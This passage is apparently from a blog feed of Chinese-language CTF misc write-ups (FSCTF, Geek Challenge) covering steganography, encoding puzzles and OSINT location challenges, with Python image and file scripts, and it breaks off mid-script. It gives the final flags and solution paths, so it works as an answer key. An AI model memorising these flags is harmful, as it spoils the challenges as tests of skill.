47</p>\n<p>修改图片高度得到 flag</p>\n<h3 id=\"base套\"><a class=\"markdownIt-Anchor\" href=\"#base套\">#</a> base 套</h3>\n<p>base64 套好多次阿！！！</p>\n<h3 id=\"行不行啊细狗\"><a class=\"markdownIt-Anchor\" href=\"#行不行啊细狗\">#</a> 行不行啊细狗</h3>\n<p>修改 docx 文档，可能是系统问题吗？</p>\n<pre><code>FSCTF&#123;N0t_A_heRo_\n你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊\n\ndoEs_not_re@d_t\n</code></pre>\n<p>得到两串 flag</p>\n<p>将其修改压缩包后缀名</p>\n<blockquote>\n<p>document.xml</p>\n</blockquote>\n<blockquote>\n<p>He_3_Kinggggdoms}</p>\n</blockquote>\n<p>拼凑得到 flag</p>\n<h3 id=\"ez-osint\"><a class=\"markdownIt-Anchor\" href=\"#ez-osint\">#</a> ez-osint</h3>\n<p>百度搜图直接讲解，8：35-8：45</p>\n<h3 id=\"为什么不换换思路捏\"><a class=\"markdownIt-Anchor\" href=\"#为什么不换换思路捏\">#</a> 为什么不换换思路捏</h3>\n<pre><code>密文：3956305A7652305877676D656E3532626F395664776B3358723557596F52335835423055375A4556444E6C52\n</code></pre>\n<p><img data-src=\"/img/fsctfwppic/4.png\" alt=\"image-20231024083859306\"></p>\n<h3 id=\"最终试炼hhh\"><a class=\"markdownIt-Anchor\" href=\"#最终试炼hhh\">#</a> 最终试炼 hhh</h3>\n<p>压缩包文件逆序，写脚本修改一下</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">reverse_hex</span><span class=\"token punctuation\">(</span>file_path<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>file_path<span class=\"token punctuation\">,</span> <span class=\"token string\">'rb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        hex_data <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    reversed_hex <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token builtin\">reversed</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>hex_data<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">:</span> i<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>hex_data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'1.zip'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'wb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">.</span>fromhex<span class=\"token punctuation\">(</span>reversed_hex<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>reverse_hex<span class=\"token punctuation\">(</span><span class=\"token string\">'flag'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>得到 1.zip</p>\n<p>里面有个 pdf 文档，利用工具 wbStego4.3open 无密码解密即可</p>\n<h3 id=\"夜深人静的时候也会偷偷emo\"><a class=\"markdownIt-Anchor\" href=\"#夜深人静的时候也会偷偷emo\">#</a> 夜深人静的时候也会偷偷 emo</h3>\n<p>压缩包密码：12345</p>\n<p CemMEnt_Se@1s_tHe_heaaaaaart_foR_An0ther_D@y=\"\">MP3Stego 隐写 ：FSCTF</p>\n",
            "tags": [
                "wp"
            ]
        },
        {
            "id": "https://yhuanhuan01.github.io/2023/10/24/%E6%9E%81%E5%AE%A2wp/",
            "url": "https://yhuanhuan01.github.io/2023/10/24/%E6%9E%81%E5%AE%A2wp/",
            "title": "极客wp",
            "date_published": "2023-10-24T01:31:05.000Z",
            "content_html": "<h1 id=\"极客大挑战wp\"><a class=\"markdownIt-Anchor\" href=\"#极客大挑战wp\">#</a> 极客大挑战 ———wp</h1>\n<h2 id=\"misc\"><a class=\"markdownIt-Anchor\" href=\"#misc\">#</a> MISC</h2>\n<h3 id=\"cheekin\"><a class=\"markdownIt-Anchor\" href=\"#cheekin\">#</a> cheekin</h3>\n<p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/1.png\" alt=\"image-20231029201202053\"></p>\n<h3 id=\"ez_smilemo\"><a class=\"markdownIt-Anchor\" href=\"#ez_smilemo\">#</a> ez_smilemo</h3>\n<p>上网自行搜索 data.win 怎么打开。</p>\n<p>找到工具 UndertaleModTool.exe</p>\n<p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/2.png\" alt=\"image-20231029201510600\"></p>\n<blockquote>\n<p>c20xbGVfMXNfQF9uMWNlX2dAbWU=</p>\n</blockquote>\n<p>解码 base64 得到 flag :&gt; sm1le_1s_@_n1ce_g@me</p>\n<h3 id=\"death_n0te\"><a class=\"markdownIt-Anchor\" href=\"#death_n0te\">#</a> DEATH_N0TE</h3>\n<p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/kamisama.png\" alt=\"kamisama\"></p>\n<p>题目如上！</p>\n<p>很明显能发现有像素点篡改。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> PIL <span class=\"token keyword\">import</span> Image</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> numpy <span class=\"token keyword\">as</span> np</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>image <span class=\"token operator\">=</span> Image<span class=\"token punctuation\">.</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'kamisama.png'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>convert<span class=\"token punctuation\">(</span><span class=\"token string\">'RGB'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>width<span class=\"token punctuation\">,</span> height <span class=\"token operator\">=</span> image<span class=\"token punctuation\">.</span>size</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>image_array <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>array<span class=\"token punctuation\">(</span>image<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>extracted_pixels <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">for</span> y <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span> height<span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span> width<span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        pixel <span class=\"token operator\">=</span> <span class=\"token builtin\">tuple</span><span class=\"token punctuation\">(</span>image_array<span class=\"token punctuation\">[</span>y<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        extracted_pixels<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>pixel<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>width1 <span class=\"token operator\">=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span> width<span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>height1 <span class=\"token operator\">=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span> height<span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>img <span class=\"token operator\">=</span> Image<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span><span class=\"token string\">'RGB'</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>width1<span class=\"token punctuation\">,</span> height1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>pixels <span class=\"token operator\">=</span> img<span class=\"token punctuation\">.</span>load<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>index <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">for</span> y <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>height1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>width1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        img<span class=\"token punctuation\">.</span>putpixel<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> extracted_pixels<span class=\"token punctuation\">[</span>index<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        index <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>img<span class=\"token punctuation\">.</span>save<span class=\"token punctuation\">(</span><span class=\"token string\">\"1.png\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>img<span class=\"token punctuation\">.</span>show<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/3.png\" alt=\"1\"></p>\n<p>哥特表的 base64</p>\n<p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/7.png\" alt=\"img\"></p>\n<p>进行对应：TkFNRV9oMnRha3VYWH0=</p>\n<p>解密： NAME_h2takuXX}</p>\n<p>第一段：</p>\n<p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/8.png\" alt=\"image-20231029203349480\"></p>\n<p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/9.png\" alt=\"image-20231029203523790\"></p>\n<h3 id=\"下一站是哪儿呢\"><a class=\"markdownIt-Anchor\" href=\"#下一站是哪儿呢\">#</a> 下一站是哪儿呢</h3>\n<p>我和 yxx 去旅游，前一天还好好的，玩完《指挥官基恩》这个游戏就睡觉了，第二天晚上吃完饭她人就不见了，走之前留下了两张图片就消失了。你能帮我找找她坐哪个航班去哪个地方了嘛？  flag 格式：SYC {航班号_城市拼音}，城市拼音首字母大写噢</p>\n<p>附件给的挺全，说是社工，其实有图片隐写的地方</p>\n<p>1.jpg —&gt; 提取出压缩包内文件</p>\n<p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/10.png\" alt=\"image-20231029203951251\"></p>\n<p>secret.png 是银河表对应</p>\n<p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/secret.png\" alt=\"secret\"></p>\n<p>I wang to go liquor city 关键线索是白酒城  定位到四川泸州，机场是泸州白云</p>\n<p>结合聊天记录，知道 20.00 左右的飞机，出发点是深圳宝安国际机场</p>\n<p>使用软件搜索：定位航班 CZ8579  故 flag 为 CZ8579_Luzhou</p>\n<h3 id=\"qingwan心都要碎了\"><a class=\"markdownIt-Anchor\" href=\"#qingwan心都要碎了\">#</a> Qingwan 心都要碎了</h3>\n<p 地点名字=\"\">Qingwan 和 Yxx 一起去旅游，但是 Qingwan 睡的太死啦，Yxx 丢下她一个人去玩了，她一觉起来只看见 Yxx 发的朋友圈，能帮 Qingwan 找到她吗？ flag 格式：SYC</p>\n<p>百度搜图，定位重庆。搜索博物馆，第一个就是重庆中国三峡博物馆，得到 flag/</p>\n<p>SYC 重庆中国三峡博物馆}</p>\n<h3 id=\"xqr一血\"><a class=\"markdownIt-Anchor\" href=\"#xqr一血\">#</a> xqr（一血）</h3>\n<p>直接扫码，是假 flag。分析文件，里面还有张图片。进行提取。</p>\n<p>得到一个 25x25 的图片</p>\n<p>两张图片异或得到 flag.png 扫描二维码得到 flag。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> PIL <span class=\"token keyword\">import</span> Image</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> numpy <span class=\"token keyword\">as</span> np</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>img1 <span class=\"token operator\">=</span> Image<span class=\"token punctuation\">.</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'xqr.png'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>convert<span class=\"token punctuation\">(</span><span class=\"token string\">'RGB'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>img2 <span class=\"token operator\">=</span> Image<span class=\"token punctuation\">.</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'xqr2.png'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>convert<span class=\"token punctuation\">(</span><span class=\"token string\">'RGB'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>img1 <span class=\"token operator\">=</span> img1<span class=\"token punctuation\">.</span>resize<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token number\">75</span><span class=\"token punctuation\">,</span> <span class=\"token number\">75</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>img2 <span class=\"token operator\">=</span> img2<span class=\"token punctuation\">.</span>resize<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token number\">75</span><span class=\"token punctuation\">,</span> <span class=\"token number\">75</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>img1_array <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>array<span class=\"token punctuation\">(</span>img1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>img2_array <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>array<span class=\"token punctuation\">(</span>img2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>result_array <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>bitwise_xor<span class=\"token punctuation\">(</span>img1_array<span class=\"token punctuation\">,</span> img2_array<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>result_image <span class=\"token operator\">=</span> Image<span class=\"token punctuation\">.</span>fromarray<span class=\"token punctuation\">(</span>result_array<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>result_image<span class=\"token punctuation\">.</span>save<span class=\"token punctuation\">(</span><span class=\"token string\">\"22.png\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>last <span class=\"token operator\">=</span> result_image<span class=\"token punctuation\">.</span>resize<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>result_image<span class=\"token punctuation\">.</span>height<span class=\"token operator\">*</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span>result_image<span class=\"token punctuation\">.</span>width<span class=\"token operator\">*</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>last<span class=\"token punctuation\">.</span>save<span class=\"token punctuation\">(</span><span class=\"token string\">\"22.png\"</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"death_n1te\"><a class=\"markdownIt-Anchor\" href=\"#death_n1te\">#</a> DEATH_N1TE</h3>\n<p>给出一个.mp3 文件和一个.webp 文件</p>\n<p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/killer.webp\" alt=\"killer\"></p>\n<p>MP3 文件最好有一点 SSTV 音频，进行识别后</p>\n<p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/15.png\" alt=\"2\"></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> subprocess</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>input_file <span class=\"token operator\">=</span> <span class=\"token string\">\"killer.webp\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># 获取帧数</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>get_frames_command <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'webpmux'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-info'</span><span class=\"token punctuation\">,</span> input_file<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>result <span class=\"token operator\">=</span> subprocess<span class=\"token punctuation\">.</span>run<span class=\"token punctuation\">(</span>get_frames_command<span class=\"token punctuation\">,</span> capture_output<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span> text<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>lines <span class=\"token operator\">=</span> result<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>frames_line <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>line <span class=\"token keyword\">for</span> line <span class=\"token keyword\">in</span> lines <span class=\"token keyword\">if</span> <span class=\"token string\">'Number of frames:'</span> <span class=\"token keyword\">in</span> line<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>frames <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>frames_line<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">':'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\"># 提取所有帧</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> frames<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    extract_frame_command <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'webpmux'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-get'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'frame'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> input_file<span class=\"token punctuation\">,</span> <span class=\"token string\">'-o'</span><span class=\"token punctuation\">,</span> <span class=\"token string-interpolation\"><span class=\"token string\">f'frame</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>i<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">.webp'</span></span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    subprocess<span class=\"token punctuation\">.</span>run<span class=\"token punctuation\">(</span>extract_frame_command<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>分解所有帧</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> PIL <span class=\"token keyword\">import</span> Image</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># 创建新的目录来储存.png 图像</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>exists<span class=\"token punctuation\">(</span><span class=\"token string\">'png_images'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    os<span class=\"token punctuation\">.</span>makedirs<span class=\"token punctuation\">(</span><span class=\"token string\">'png_images'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># 循环遍历所有.webp 图像</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">881</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># 从 frame1.webp 到 frame880.webp</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    img_name <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f'frame</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>i<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">.webp'</span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">if</span> os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>isfile<span class=\"token punctuation\">(</span>img_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        img <span class=\"token operator\">=</span> Image<span class=\"token punctuation\">.</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>img_name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        img<span class=\"token punctuation\">.</span>save<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'png_images/frame</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>i<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">.png'</span></span><span class=\"token punctuation\">,</span> <span class=\"token string\">'PNG'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>img_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> does not exist.'</span></span><span 